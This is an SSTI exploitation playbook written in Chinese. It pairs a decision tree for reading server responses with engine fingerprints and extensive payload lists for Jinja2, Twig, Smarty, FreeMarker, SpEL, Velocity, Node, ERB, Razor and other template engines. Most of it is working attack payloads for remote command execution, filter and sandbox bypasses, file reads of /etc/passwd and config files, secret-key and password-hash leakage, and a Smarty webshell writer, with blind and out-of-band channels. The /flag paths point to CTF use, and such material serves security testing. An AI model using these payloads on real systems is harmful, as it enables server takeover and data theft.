# SSTI Bypass Playbook

这是 SSTI 绕过与执行载荷 playbook。先用响应证据决定下一步，再按上下文、过滤条件和模板引擎选 payload；不要把它当成从上到下喷洒的字典。

## 响应分类决策树（响应信号速查）

每个入口都先保存普通 canary、业务正常值、状态码、响应长度、反射位置、cookie/session 变化，再提交最小模板探针。看到响应后按下面分支走：

```text
数值求值成功，例如 49 / 1097
结论：已确认服务端模板求值。
动作：立刻做引擎指纹，不再扩大基础探针；优先读 context/config/source/env/常见 flag 路径，再考虑 RCE。

对象展开、debug/context 泄露、模板变量被解析
结论：已确认进入模板上下文，可能还没确认可执行能力。
动作：枚举可见对象、过滤器、helper、settings/session/request；选择最短低风险读信息 payload。

template syntax error / internal server error / 模板栈
结论：很可能到达模板引擎，但语法族、闭合方式或上下文不对。
动作：保留错误片段和引擎名；换同引擎合法语法、闭合当前表达式/字符串/标签后再注入；不要直接升级 RCE。

contains forbidden characters / forbidden input / WAF block
结论：输入在模板前被前置过滤或规则拦截。
动作：用单字符探测定位禁用集合；若 `{{` / `}}` 被禁，换 `{% ... %}` statement tag、`${...}`、`#{...}`、`<%= ... %>`、视图名预处理或参数外置。

not a number / invalid rendered value / computed value rejected
结论：payload 可能已经求值，但渲染结果被后置业务校验拦截。
动作：保持最终输出为合法数字/JSON/固定前缀；把敏感读取放到条件、语句块、时间差、OOB 或写文件通道。

missing parameter / malformed JSON / bad request
结论：payload 破坏了请求结构，不足以判断 SSTI。
动作：恢复完整业务字段，只在一个字段放最小 payload；必要时 URL/JSON/HTML 编码，先让请求和业务流程正常。

原样反射 / HTML 转义 / JSON 转义
结论：可能是普通反射，也可能是当前页面未消费、保存后延迟渲染或二次 render。
动作：不要立即判死；检查后续确认页、预览、资料页、导出、邮件、错误页、后台任务和同 session 的下一步响应。

无回显但状态、长度、时间、异步副作用变化
结论：可能是盲执行、无回显模板、队列消费或后置校验。
动作：改用布尔、时间、错误回显、OOB、写静态文件或可观察状态变更，避免继续尝试直接回显型 payload。
```

## 黑盒识别提示与完整探测清单

### 入口覆盖

不要只测页面上看得到的输入。对每个候选功能建立一张小表：入口、字段、请求形态、session、响应分类、下一步动作、结论。

```text
请求位置: query、form、JSON、multipart、path segment、matrix param、fragment 被前端转发时
状态位置: cookie、session 字段、JWT claim、server-side profile、购物车/草稿/配置项
头部位置: Host、Referer、User-Agent、X-Forwarded-*、Accept-Language、Content-Type
模板位置: template name、view name、include/partial/layout/helper 名、邮件主题/正文、导出标题
消费位置: 当前响应、下一步确认页、预览页、用户主页、管理页、错误页、PDF/CSV/邮件/通知/队列任务
```

### 基线对比

每个入口至少保存这些响应，后续只和同一入口、同一 session、同一业务状态比较：

```text
普通 canary:       sstiCANARY123
业务合法值:        当前功能本来接受的最小正常值
语法 canary:       {{7*7}} / {{364|add:733}} / ${7*7} / #{7*7} / <%= 7*7 %>
字符探测:          单独提交 {、%、_、.、[、]、引号、空格、括号，判断过滤层或语法层
延迟消费:          提交后访问下一步页面、预览、导出、错误页和后台可见页面
```

判断证据优先级：

```text
输出数值变化 / 对象展开 / debug 信息 > 模板错误栈 > 布尔/时间/OOB 差异 > 原样反射
```

### 引擎指纹矩阵

不要用一个 Jinja payload 排除所有 SSTI。按响应行为逐步缩小：

```text
{{7*7}} -> 49                 Jinja2 / Twig / Nunjucks / Pebble / Jinjava / Handlebars-like
{{364|add:733}} -> 1097       Django Templates
${7*7} -> 49                  FreeMarker / Java EL / SpEL / Groovy / Mako-like
#{7*7} -> 49                  SpEL / Thymeleaf / FreeMarker legacy / Pug / Slim
<%= 7*7 %> -> 49              ERB / EJS / ASP / EEx / Mojolicious
@(7*7) -> 49                  Razor
{{printf "%d" 49}} -> 49      Go template
```

Django 特别注意：`{{7*7}}` 往往不是有效 Django Template 算术探针。Django 目标优先用 filter、debug、messages/settings/session 相关探针。

### 不只看当前响应

不要把 SSTI 只当成单请求反射问题。某些输入会先保存，再在后续页面或后台流程中被模板渲染：

```text
GET 表单 -> POST 字段 -> session/cookie/server-side state -> 下一步页面 -> 最终确认页/API/邮件/导出/错误页
```

如果 payload 在提交响应里原样反射，不代表没有 SSTI；它可能在后续确认页、预览、后台、导出、错误模板或二次 render 时才求值。

### 过滤与后置校验分离

同一个失败现象可能来自不同层：

```text
提交前被拒绝:        前置黑名单/参数校验
响应 500 模板错误:    到达模板引擎但语法不兼容或上下文错误
原样输出:            未求值、被转义、或求值发生在别的步骤
求值后被拒绝:        后置校验检查渲染结果
无输出但变慢/OOB:     盲执行或无回显上下文
```

如果是后置校验，只让最终渲染结果满足格式；敏感读取、运算或条件判断可以放在语句块内部。常见策略：

```text
数字字段: 输出长度、字符 ord 串、hash 十进制、逐位布尔/时间判断，或固定数字哨兵
JSON 字段: 保持 JSON 字符串/数字合法，避免破坏引号和逗号
固定前缀: 先输出合法前缀，再用条件/时间/OOB 带出数据
无回显:   写入可访问静态文件、触发 DNS/HTTP OOB、用 sleep 做布尔枚举
```

## 确认与升级门槛

### 什么时候确认 SSTI

满足任一强证据即可确认：

```text
算术/字符串表达式被求值，例如 {{7*7}} -> 49、{{'a'~'b'}} -> ab、Django add -> 1097
模板对象、上下文、settings/config/session/request 被展开
错误栈明确来自模板引擎，并且换语法后响应按模板语义变化
布尔/时间/OOB 探针在同一入口可复现，且普通 canary 无同样差异
```

以下证据不足以单独确认：

```text
只看到 Twig/Jinja/Django 版本泄露
只看到输入被原样反射或 HTML 转义
只看到 500 但没有模板错误特征
只看到 WAF/非法字符提示但没有求值、错误栈或延迟消费证据
```

### 什么时候升级利用

确认求值后按低风险到高价值推进：

```text
1. context/debug/settings/config/session/request/env/source 泄露
2. 读当前工作目录、模板源码、配置文件、常见 flag 路径
3. 用最短命令执行探针验证 id/whoami，不先跑大范围 find
4. 根据输出约束切换直接回显、错误回显、布尔、时间、OOB、写文件
5. 拿到 flag 或决定性 secret 后停止扩大 payload
```

### 什么时候收敛或换入口

同一入口出现下面情况时，记录结论后换入口或换消费点：

```text
所有语法族都原样输出，且后续页面/导出/错误页没有消费
单字符探测显示模板分隔符全部被前置过滤，且没有 statement tag、替代语法、参数外置或编码空间
sandbox map 显示可达对象没有文件/配置/命令/业务 secret 访问路径
时间/OOB/写文件均不可观察，且业务流程没有可见副作用
```

## 上下文与入口

### 模板文本

用户输入直接成为模板源码文本时，优先使用对应分隔符求值：

```text
{{7*7}}                 Jinja2 / Twig / Nunjucks / Pebble / Jinjava / Handlebars-like
${7*7}                  FreeMarker / Java EL / SpEL / Groovy / Mako-like
#{7*7}                  SpEL / Thymeleaf / FreeMarker legacy / Pug / Slim
<%= 7*7 %>              ERB / EJS / ASP / EEx / Mojolicious
@(1+2)                  Razor
[=3*3]                  FreeMarker 替代语法
```

### 表达式或变量名内部

用户输入被拼在已有表达式里时，先闭合当前表达式，再进入可执行语法：

```text
user}} {{7*7}} {{
user%}{{7*7}}{%
user') }}{{7*7}}{{ ('
user") }}{{7*7}}{{ ("
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### 语句标签可用但表达式标签受限

Jinja2 / Twig / Nunjucks / Mako 等允许 statement tag 时，可以避开 `{{...}}`：

```jinja2
{% if 7*7 == 49 %}49{% endif %}
{% set x = 7*7 %}49
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{x}}{% endwith %}
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}OK{% endif %}
{% set x = cycler.__init__.__globals__.os.popen('id').read() %}{{x}}
```

如果表达式输出会被后置校验拦截，把敏感动作放在语句块里，最终只输出允许格式：

```jinja2
{% set x = cycler.__init__.__globals__.__builtins__.open('/flag').read() %}123
{% if cycler.__init__.__globals__.__builtins__.open('/flag').read().startswith('flag{') %}1{% else %}0{% endif %}
```

上面是形态示例：真实目标中要根据可用对象、过滤字符和输出格式替换读取目标与编码方式。若需要数字化输出，优先使用目标环境已存在的过滤器/函数，或改用逐字符布尔、长度、hash、写文件、OOB 等通道。

### 模板名、视图名、include、二次渲染

很多 SSTI 不在页面文本，而在模板名或二次渲染点：

```text
Spring/Thymeleaf 视图名: __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
Twig include: {{ include('wp-config.php') }}
Jinja include/config: {{ config.from_pyfile('/tmp/x.py') }}
CMS/email/PDF/Markdown: 保存 {{7*7}} 后由预览、发送、导出或后台审核触发第二次 render
Handlebars layout/path: layout=../../routes/index.js 或模板 partial/helper 名称可控时找 LFI/RCE 链
```

### 无回显、错误、延迟、OOB

同一执行链可以换成不同反馈通道：

```text
直接回显:    {{ lipsum.__globals__['os'].popen('id').read() }}
错误回显:    {{ cycler.__init__.__globals__.__builtins__.getattr('', 'x' + cycler.__init__.__globals__.os.popen('id').read()) }}
布尔反馈:    {{ 1 / (cycler.__init__.__globals__.os.popen('id')._proc.wait() == 0) }}
时间反馈:    {{ lipsum.__globals__['os'].popen('sleep 3').read() }}
OOB/写文件:  {{ lipsum.__globals__['os'].popen('id > static/proof.txt').read() }}
```

## 过滤绕过

### 禁 `{{` / `}}`

```jinja2
{% if 7*7 == 49 %}49{% endif %}
{% set x = 7*7 %}49
{% print(7*7) %}
{% if 7*7 == 49 %}OK{% endif %}
{% set x = cycler.__init__.__globals__.__builtins__.open('/flag').read() %}123
```

```text
${7*7}          Java/FreeMarker/Mako/Groovy
#{7*7}          SpEL/Thymeleaf/FreeMarker legacy/Pug/Slim
<%= 7*7 %>      ERB/EJS/ASP/EEx
@(1+2)          Razor
[=3*3]          FreeMarker
```

### 禁 `{` / `}`

```text
<%= `id` %>                                      ERB
<%= global.process.mainModule.require('child_process').execSync('id') %>  EJS
@(System.Diagnostics.Process.Start("cmd.exe","/c whoami"))                Razor
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x                   Thymeleaf view preprocessing
```

### 禁 `%`

```text
{{ lipsum.__globals__['os'].popen('id').read() }}   Jinja2 纯表达式
{{ cycler.__init__.__globals__.__builtins__.open('/flag').read() }} Jinja2 文件读取
${"freemarker.template.utility.Execute"?new()("id")} FreeMarker inline
{{['id']|map('system')|join}}                       Twig 纯表达式
```

### 禁 `.`

```jinja2
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
```

```java
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${T(java.lang.Runtime)['getRuntime']()['exec']('id')}
```

### 禁 `_`

```jinja2
{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
{{ request|attr(["_"*2,"class","_"*2]|join) }}
{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}
```

```text
?f=%s%sclass%s%s&a=_
headers/cookies/query 中传入 __class__、__globals__、__builtins__、__import__
```

### 禁 `[` / `]`

```jinja2
{{ request|attr('__getitem__')('application')|attr('__getitem__')('__globals__') }}
{{ request|attr(request.args.getlist(request.args.l)|join) }}
```

```text
?l=a&a=_&a=_&a=class&a=_&a=_
```

### 禁引号

```jinja2
{{ request|attr(request.args.c) }}                 ?c=__class__
{{ config.__class__.from_envvar.__globals__.import_string(request.args.m).popen(request.args.c).read() }}  ?m=os&c=id
```

```text
Java: T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))
FreeMarker: 9?lower_abc + 4?lower_abc              生成 id
PHP/Twig: query 参数承载函数名/命令，map/call_user_func 调用
Node: 从已有字符串 constructor、process、mainModule 派生
```

### 禁空格

```text
{{7*7}}
{{lipsum.__globals__['os'].popen('cat$IFS/etc/passwd').read()}}
{{['cat$IFS/etc/passwd']|map('system')|join}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%=IO.popen('id').read%>
```

命令空格替代：

```text
$IFS
${IFS}
tab/newline
cat</etc/passwd
/bin/sh,-c,id 传给 ProcessBuilder/数组参数
```

### 禁括号

```twig
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
```

```jinja2
{% if lipsum.__globals__['os'].popen('id').read().startswith('uid=') %}OK{% endif %}
```

```text
Razor: @DateTime.Now / @Model.Property 类表达式先确认动态编译
Velocity: #set($x=...)$x
```

### 禁管道 `|`

```jinja2
{{ request.__class__ }}
{{ request['__class__'] }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```twig
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{dump(_context)}}
```

### 禁数字

```text
Jinja2: true+true、false、字符串长度、range|length、已有对象切片
Java: Boolean.TRUE.compareTo(false)、Character.toString(...)
FreeMarker: true?string、?length、?index_of、lower_abc/upper_abc
Ruby/PHP/Node: 字符串 length、ord/chr、布尔算术
```

### 禁字母

```text
从 request 参数/header/cookie 带入关键字
用 hex/unicode 转义生成 __globals__、os、id、system
从已有字符串切片拼接函数名
利用模板内置对象短名：self、config、request、app、_context、cycler、joiner、lipsum、namespace
```

### 禁关键字

```text
os        -> lipsum.__globals__['o'+'s'] / import_string('os') / request 参数
system    -> popen / passthru / shell_exec / call_user_func / ProcessBuilder / Runtime.exec / child_process
import    -> __builtins__['__import__'] / import_string / forName / constructor / _load
class     -> attr('__class__') / getClass() / TYPE / constructor
config    -> request.application / url_for.__globals__ / get_flashed_messages.__globals__
```

### 长度限制

```text
Jinja2 短链: {{lipsum.__globals__['os'].popen('id').read()}}
Jinja2 参数外置: {{lipsum.__globals__['os'].popen(request.args.c).read()}}&c=id
Twig 短链: {{['id']|map('system')|join}}
FreeMarker 短链: ${"freemarker.template.utility.Execute"?new()("id")}
Ruby 短链: <%=`id`%>
EEx 短链: <%=elem(System.shell("id"),0)%>
```

### Sandbox

```text
Jinja2: lipsum/cycler/joiner/namespace.__globals__ 优先于 __subclasses__ offset
Jinja2: config.__class__.from_envvar.__globals__.import_string('os').popen('id').read()
Twig: map/filter/reduce/sort + callable，_self.env/registerUndefinedFilterCallback 老版本链
FreeMarker: ?new 可用时 Execute；受限时找 ObjectWrapper/TemplateModel/可访问业务对象 classloader
SpEL/EL: T(java.lang.Runtime) 被禁时 ''.getClass().forName(...) 或 request/session 反射
Node: process/mainModule/constructor/_load、helper、prototype pollution、layout traversal
Ruby/ERB: Kernel、IO、Open3、反引号；Liquid/Mustache 默认能力弱，优先找自定义 filter/helper
Go template: RCE 依赖传入对象公开方法；先利用 {{.}}、{{.Field}}、{{call .Fn "id"}}
```

### 自动转义 / HTML 转义

SSTI 执行与 HTML 是否转义是两件事。需要 HTML impact 时才考虑：

```jinja2
{{'<script>alert(1)</script>'|safe}}
```

服务端执行仍优先看：

```text
数字结果、对象字符串、错误、文件内容、命令输出、写文件、OOB 请求
```

## 引擎载荷

### Jinja2 / Flask

```jinja2
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{% debug %}
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
{{get_flashed_messages.__globals__.__builtins__.open('/flag').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.from_envvar.__globals__.import_string('os').popen('id').read()}}
```

无 `{{ }}`：

```jinja2
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen(request.args.c).read() %}{{x}}{% endwith %}
{% set x = cycler.__init__.__globals__.__builtins__.open('/flag').read() %}OK
{% if cycler.__init__.__globals__.__builtins__.open('/flag').read() %}1{% endif %}
```

有后置输出格式校验时，不要把敏感内容直接输出。先用固定合法输出证明代码块执行，再用长度、逐字符布尔、时间或数字编码取回内容。

无 `.` / `_` / `[]` 组合：

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Django Templates

```django
{{364|add:733}}
{% debug %}
{{messages.storages.0.signer.key}}
{{settings.SECRET_KEY}}
{{request.session.items}}
{% include 'admin/base.html' %}
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}}:{{e.user.password}}{% endfor %}
{{'<script>alert(1)</script>'|safe}}
```

Django 黑盒优先级：

```text
1. 用 `{{364|add:733}}` 或内置 filter 证明模板求值，不要依赖 Jinja 风格算术。
2. 试 `{% debug %}` 判断是否能列出上下文。
3. 试 settings/session/messages/request 相关对象泄露；SECRET_KEY、数据库配置和调试设置通常比命令执行更有价值。
4. 多步表单中，检查输入在后续确认页、用户首页、消息、邮件、导出或错误页是否二次渲染。
```

### Mako / Tornado / Bottle

```mako
${7*7}
<% import os; x=os.popen('id').read() %>${x}
${self.module.cache.util.os.popen('id').read()}
${self.template.__init__.__globals__['os'].popen('id').read()}
```

```tornado
{{7*7}}
{% import os %}{{os.popen('id').read()}}
```

### Twig

```twig
{{7*7}}
{{7*'7'}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
{{include('wp-config.php')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{{'id':'shell_exec'}|map('call_user_func')|join}}
{{[0]|reduce('system','id')}}
{{['cat$IFS/etc/passwd']|map('system')|join}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

无引号/混淆：

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

### Smarty / Blade / Latte

```smarty
{$smarty.version}
{php}echo `id`;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

```blade
{{7*7}}
{{system('id')}}
{{passthru(request('c'))}}
```

```latte
{var $X="POC"}{$X}
{php system('id')}
```

### FreeMarker

```freemarker
${3*3}
#{3*3}
[=3*3]
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

字符构造：

```freemarker
${9?lower_abc+4?lower_abc}
```

老版本 sandbox：

```freemarker
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### SpEL / Java EL / Thymeleaf / OGNL

```java
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
[(7*7)]
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```

OGNL：

```java
@java.lang.Integer@valueOf('1')
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

Java 字符拼接：

```java
${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}
```

### Velocity / Pebble / Jinjava / Groovy

```velocity
#set($x=7*7)$x
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($out=$p.getInputStream())
#foreach($i in [1..$out.available()])$out.read()#end
```

```pebble
{{someString.toUPPERCASE()}}
{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
```

```jinjava
{{'a'.toUpperCase()}}
{{request}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"id\"); x.start()")}}
```

```groovy
${9*9}
${new File('/etc/passwd').text}
${"id".execute().text}
${((char)105).toString()+((char)100).toString()}
```

### JavaScript / Node

EJS / Underscore：

```ejs
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

Pug：

```pug
#{7*7}
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

Nunjucks：

```nunjucks
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

Handlebars：

```handlebars
{{this}}
{{self}}
{{#with "s" as |string|}}{{#with string.sub as |sub|}}{{lookup sub "constructor"}}{{/with}}{{/with}}
```

Lodash：

```lodash
{{= _.VERSION}}
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

### Ruby / .NET / Go / Elixir / Perl

```erb
<%= 7*7 %>
<%= File.read('/etc/passwd') %>
<%= `id` %>
<%= IO.popen('id').read %>
<% require 'open3' %><% _i,o,_e,_t=Open3.popen3('id') %><%= o.read %>
```

```slim
#{7*7}
#{%x|id|}
```

```razor
@(1+2)
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@{ var p = System.Diagnostics.Process.Start("/bin/sh","-c id"); }
```

```asp
<%= 7*7 %>
<%= CreateObject("Wscript.Shell").Exec("whoami").StdOut.ReadAll() %>
```

```gotemplate
{{ . }}
{{ .Password }}
{{ printf "%s" "ssti" }}
{{ call .System "id" }}
{{ .System "id" }}
```

```eex
<%= 7*7 %>
<%= File.read!("/etc/passwd") %>
<%= elem(System.shell("id"),0) %>
```

```mojo
<%= 7*7 %>
<%= qx(id) %>
```

## 工具对应场景

```text
TInjA      多引擎 polyglot 指纹、SSTI/CSTI 快速区分
SSTImap    已知 URL/参数/请求体后的自动化枚举与交互 shell
tplmap     老环境、Python2 兼容链或历史 payload 对照
Fenjing    Jinja2/Flask 过滤极强时生成 payload 变体
```
